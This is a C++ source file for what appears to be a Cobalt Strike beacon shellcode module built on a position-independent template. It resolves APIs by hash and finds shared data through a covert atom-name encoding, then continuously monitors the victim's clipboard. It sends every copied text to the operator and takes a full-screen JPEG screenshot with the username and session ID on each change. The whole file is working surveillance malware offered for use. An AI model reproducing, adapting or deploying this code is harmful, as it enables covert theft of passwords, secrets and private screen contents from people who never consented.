#include <common.h>
#include <constexpr.h>
#include <resolve.h>
#include <gdiplus.h>

using namespace stardust;
using namespace Gdiplus;


extern "C" auto declfn entry(
    _In_ void* args
) -> void {
    stardust::instance()
        .start( args );
}

#define CALLBACK_OUTPUT      0x0
#define CALLBACK_SCREENSHOT  0x03
#define CALLBACK_ERROR       0x0d
#define ATOM_SUFFIX L"clipboardmon"

declfn instance::instance(
    void
) {
    //
    // calculate the shellcode base address + size
    base.address = RipStart();
    base.length  = ( RipData() - base.address ) + END_OFFSET;

    //
    // load the modules from PEB or any other desired way
    //

    if ( ! (( ntdll.handle = resolve::module( expr::hash_string<wchar_t>( L"ntdll.dll" ) ) )) ) {
        return;
    }

    if ( ! (( kernel32.handle = resolve::module( expr::hash_string<wchar_t>( L"kernel32.dll" ) ) )) ) {
        return;
    }

    //
    // let the macro handle the resolving part automatically
    //

    RESOLVE_IMPORT( ntdll );
    RESOLVE_IMPORT( kernel32 );

    if ( ! (( user32.handle = reinterpret_cast<uintptr_t>( kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) ) ) )) ) {
        return;
    }
    RESOLVE_IMPORT( user32 );

    if ( ! (( gdi32.handle = reinterpret_cast<uintptr_t>( kernel32.LoadLibraryA( symbol<const char*>( "gdi32.dll" ) ) ) )) ) {
        return;
    }
    RESOLVE_IMPORT( gdi32 );

    if ( ! (( msvcrt.handle = reinterpret_cast<uintptr_t>( kernel32.LoadLibraryA( symbol<const char*>( "msvcrt.dll" ) ) ) )) ) {
        return;
    }
    RESOLVE_IMPORT( msvcrt );

    if ( ! (( combase.handle = reinterpret_cast<uintptr_t>( kernel32.LoadLibraryA( symbol<const char*>( "combase.dll" ) ) ) )) ) {
        return;
    }
    RESOLVE_IMPORT( combase );

    if ( ! (( gdiplus.handle = reinterpret_cast<uintptr_t>( kernel32.LoadLibraryA( symbol<const char*>( "gdiplus.dll" ) ) ) )) ) {
        return;
    }
    RESOLVE_IMPORT( gdiplus );
}

//-------------------------------------------------------------
// Convert the given HBITMAP to a JPEG in memory using GDI+
// credit: https://github.com/WKL-Sec/HiddenDesktop/blob/14252f58e3f5379301f0d6334f92f8b96f321a16/client/scmain.c#L125
//-------------------------------------------------------------
auto declfn instance::BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSize) -> BOOL
{

    GdiplusStartupInput gdiplusStartupInput;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;

    ULONG_PTR gdiplusToken = 0;
    Status stat = gdiplus.GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    if (stat != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdiplusStartup failed: %d", stat);
        return FALSE;
    }
    GpBitmap* pGpBitmap = NULL;
    stat = gdiplus.GdipCreateBitmapFromHBITMAP(hBitmap, NULL, &pGpBitmap);
    if (stat != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipCreateBitmapFromHBITMAP failed: %d", stat);
        gdiplus.GdiplusShutdown(gdiplusToken);
        return FALSE;
    }
    IStream* pStream = NULL;
    if (combase.CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] CreateStreamOnHGlobal failed");
        gdiplus.GdipDisposeImage((GpImage*)pGpBitmap);
        gdiplus.GdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    CLSID clsidEncoderQuality = { 0x1d5be4b5, 0xfa4a, 0x452d, {0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb} };
    encoderParams.Parameter[0].Guid = clsidEncoderQuality;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;

    CLSID clsidJPEG = { 0x557cf401, 0x1a04, 0x11d3, {0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e} };

    stat = gdiplus.GdipSaveImageToStream((GpImage*)pGpBitmap, pStream, &clsidJPEG, &encoderParams);
    if (stat != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipSaveImageToStream failed: %d", stat);
        pStream->Release();
        gdiplus.GdipDisposeImage((GpImage*)pGpBitmap);
        gdiplus.GdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    LARGE_INTEGER liZero = { 0 };
    ULARGE_INTEGER uliSize = { 0 };
    if (pStream->Seek(liZero, STREAM_SEEK_END, &uliSize) != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Seek to end failed");
        pStream->Release();
        gdiplus.GdipDisposeImage((GpImage*)pGpBitmap);
        gdiplus.GdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    *pJpegSize = (DWORD)uliSize.QuadPart;
    *pJpegData = (BYTE*)msvcrt.malloc(*pJpegSize);
    if (!*pJpegData) {
        pStream->Release();
        gdiplus.GdipDisposeImage((GpImage*)pGpBitmap);
        gdiplus.GdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    if (pStream->Seek(liZero, STREAM_SEEK_SET, NULL) != S_OK) {
        msvcrt.free(*pJpegData);
        pStream->Release();
        gdiplus.GdipDisposeImage((GpImage*)pGpBitmap);
        gdiplus.GdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    ULONG bytesRead = 0;
    if (pStream->Read(*pJpegData, *pJpegSize, &bytesRead) != S_OK || bytesRead != *pJpegSize) {
        msvcrt.free(*pJpegData);
        pStream->Release();
        gdiplus.GdipDisposeImage((GpImage*)pGpBitmap);
        gdiplus.GdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    pStream->Release();
    gdiplus.GdipDisposeImage((GpImage*)pGpBitmap);
    gdiplus.GdiplusShutdown(gdiplusToken);
    return TRUE;
}

auto declfn instance::downloadScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) -> void {
    int messageLength = 4 + jpgLen + 4 + 4 + titleLen + 4 + usernameLen;
    char* packedData = (char*)msvcrt.malloc(messageLength);

    // //pack on jpgLen/fileSize as 4-byte int second
    packedData[0] = jpgLen & 0xFF;
    packedData[1] = (jpgLen >> 8) & 0xFF;
    packedData[2] = (jpgLen >> 16) & 0xFF;
    packedData[3] = (jpgLen >> 24) & 0xFF;

    int packedIndex = 4;

    // //pack on the bytes of jpg/returnData
    for (int i = 0; i < jpgLen; i++) {
        packedData[packedIndex] = jpg[i];
        packedIndex++;
    }

    //pack on session as 4-byte int first
    packedData[packedIndex] = session & 0xFF;
    packedData[packedIndex + 1] = (session >> 8) & 0xFF;
    packedData[packedIndex + 2] = (session >> 16) & 0xFF;
    packedData[packedIndex + 3] = (session >> 24) & 0xFF;

    //pack on titleLength as 4-byte int second
    packedData[packedIndex + 4] = titleLen & 0xFF;
    packedData[packedIndex + 5] = (titleLen >> 8) & 0xFF;
    packedData[packedIndex + 6] = (titleLen >> 16) & 0xFF;
    packedData[packedIndex + 7] = (titleLen >> 24) & 0xFF;

    packedIndex += 8;

    //pack on the bytes of title
    for (int i = 0; i < titleLen; i++) {
        packedData[packedIndex] = windowTitle[i];
        packedIndex++;
    }

    //pack on userLength as 4-byte int second
    packedData[packedIndex] = usernameLen & 0xFF;
    packedData[packedIndex + 1] = (usernameLen >> 8) & 0xFF;
    packedData[packedIndex + 2] = (usernameLen >> 16) & 0xFF;
    packedData[packedIndex + 3] = (usernameLen >> 24) & 0xFF;

    packedIndex += 4;

    //pack on the bytes of user
    for (int i = 0; i < usernameLen; i++) {
        packedData[packedIndex] = username[i];
        packedIndex++;
    }

    BeaconOutput(CALLBACK_SCREENSHOT, packedData, messageLength);
    return;
}

auto declfn instance::SaveHBITMAPToFile(HBITMAP hBitmap) -> BOOL{
    BYTE* jpegData = NULL;
    DWORD jpegSize = 0;
    int quality = 90;  // adjust JPEG quality (0–100) as desired

    if (!BitmapToJpeg(hBitmap, quality, &jpegData, &jpegSize)) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to convert bitmap to JPEG");
        return FALSE;
    }

    // BeaconPrintf(CALLBACK_OUTPUT, "Downloading JPEG over beacon as a screenshot");

    DWORD session = -1;
    kernel32.ProcessIdToSessionId(kernel32.GetCurrentProcessId(), &session);

    char* user = (char*)msvcrt.getenv("USERNAME");
    char title[] = "Screenshot";
    int userLength = msvcrt._snprintf(NULL, 0, "%s", user);
    int titleLength = msvcrt._snprintf(NULL, 0, "%s", title);

    downloadScreenshot((char*)jpegData, (int)jpegSize,
                       session,
                       (char*)title, titleLength,
                       (char*)user, userLength);

    msvcrt.free(jpegData);
    return TRUE;
}


// Credit: https://github.com/CodeXTF2/ScreenshotBOF
auto declfn instance::Screenshot() -> void {
    BOOL dpi = user32.SetProcessDPIAware(); // Set DPI awareness to fix incomplete screenshots
    HBITMAP hBitmap = NULL;
    int x1 = user32.GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1 = user32.GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = user32.GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = user32.GetSystemMetrics(SM_CYVIRTUALSCREEN);
    HDC hScreen = user32.GetDC(NULL);
    if (hScreen == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] pGetDC(NULL) returned NULL. Last error: %lu", kernel32.GetLastError());
        return;
    }

    HDC hDC = gdi32.CreateCompatibleDC(hScreen);
    if (hDC == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] pCreateCompatibleDC failed. Last error: %lu", kernel32.GetLastError());
        user32.ReleaseDC(NULL, hScreen);
        return;
    }
    hBitmap = gdi32.CreateCompatibleBitmap(hScreen, w, h);
    if (!hBitmap) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create full screen bitmap");
        user32.ReleaseDC(NULL, hScreen);
        gdi32.DeleteDC(hDC);
        return;
    }

    // BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] GetDC: %p",hScreen);
    // BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CreateCompatibleDC returned: %p",hDC);
    // BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CreateCompatibleBitmap returned: %p",hBitmap);

    HGDIOBJ old_obj = gdi32.SelectObject(hDC, hBitmap);
    if (gdi32.BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY)) {
        DWORD errorCode = kernel32.GetLastError();
        // BeaconPrintf(CALLBACK_ERROR,
        //              "[DEBUG] BitBlt failed for full screen capture. Error code: %lu",
        //              errorCode);
        //
        // BeaconPrintf(CALLBACK_ERROR,
        //              "[DEBUG] hDC: %p, hScreen: %p, old_obj: %p",
        //              hDC, hScreen, old_obj);
        // BeaconPrintf(CALLBACK_ERROR,
        //              "[DEBUG] Screen region: x1: %d, y1: %d, width: %d, height: %d",
        //              x1, y1, w, h);

        if (hScreen == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hScreen is NULL (handle invalid)");
        } else {
            DWORD flags = 0;
            if (!kernel32.GetHandleInformation(hScreen, &flags)) {
                DWORD errorCode = kernel32.GetLastError();
                // BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hScreen appears invalid (pGetHandleInformation failed) - Error code: %lu",errorCode);
            } else {
                // BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] hScreen is valid (flags: 0x%lx)", flags);
            }
        }
        // Check hDC
        if (hDC == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hDC is NULL (handle invalid)");
        } else {
            DWORD flags = 0;
            if (!kernel32.GetHandleInformation(hDC, &flags)) {
                // BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hDC appears invalid (pGetHandleInformation failed) - Error code: %lu",errorCode);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] hDC is valid (flags: 0x%lx)", flags);
            }
        }
    }
    gdi32.SelectObject(hDC, old_obj);
    gdi32.DeleteDC(hDC);
    user32.ReleaseDC(NULL, hScreen);
    if (hBitmap) {
        if (!SaveHBITMAPToFile(hBitmap))
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save JPEG");
        else
            // BeaconPrintf(CALLBACK_OUTPUT, "Screenshot saved/downloaded successfully.");
        gdi32.DeleteObject(hBitmap);
    }
}

auto declfn instance::GetMemAddr() -> pSharedData {
    size_t address = 0;
    WCHAR atomName[] = L"\x01" ATOM_SUFFIX;

    // Loop over 64 bits in x64 size_t
    for (int count = 0; count < sizeof(size_t) * 8; count++)
    {
        // Check whether Atom exists. If yes, bit = 1, if no bit = 0
        size_t bit = kernel32.FindAtomW(atomName) == 0 ? 0 : 1;

        // Shift bit left <count> places then use OR assignment to set address
        address |= (bit << count);

        // Increment first byte in atomName to create atom name for next loop
        atomName[0] += 1;
    }

    return (pSharedData)address;
}

auto declfn instance::start(
    _In_ void* arg
) -> void {
    // Resolve struct address
    pSharedData sd = GetMemAddr();
    BeaconPrintf = (_BeaconPrintf)sd->pBeaconPrintf;
    BeaconOutput = (_BeaconOutput)sd->pBeaconOutput;

    DWORD lastSeq = 0;
    do {
        DWORD currentSeq = user32.GetClipboardSequenceNumber();

        if (currentSeq != lastSeq) {
            lastSeq = currentSeq;

            if (user32.OpenClipboard(NULL)) {
                HANDLE hData = user32.GetClipboardData(CF_TEXT);
                if (hData != NULL) {
                    char *pszText = (char*)kernel32.GlobalLock(hData);
                    if (pszText != NULL) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Clipboard changed:\n%s", pszText);
                        kernel32.GlobalUnlock(hData);
                        Screenshot();
                    }
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Clipboard changed (non-text data or empty)");
                }
                user32.CloseClipboard();
            } else {
                BeaconPrintf(CALLBACK_ERROR, "Failed to open clipboard\n");
            }
        }
    } while (kernel32.WaitForSingleObject(sd->hEvent, 500) == WAIT_TIMEOUT);
}
